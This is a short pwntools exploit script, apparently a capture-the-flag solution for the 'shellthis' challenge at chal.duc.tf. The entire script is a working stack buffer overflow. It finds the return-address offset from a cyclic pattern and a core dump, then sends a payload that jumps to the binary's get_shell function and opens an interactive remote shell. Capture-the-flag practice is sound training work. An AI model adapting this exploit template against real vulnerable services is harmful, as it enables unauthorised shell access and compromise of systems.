#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellthis')
context.log_level = 'INFO'

p = process(binary.path)
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
offset = cyclic_find(core.read(core.rsp, 8),n=8)
log.info('offset: ' + hex(offset))

p = remote('chal.duc.tf', 30002)

payload  = offset * b'A'
payload += p64(binary.sym.get_shell)

p.sendlineafter('Please tell me your name: ',payload)
p.interactive()

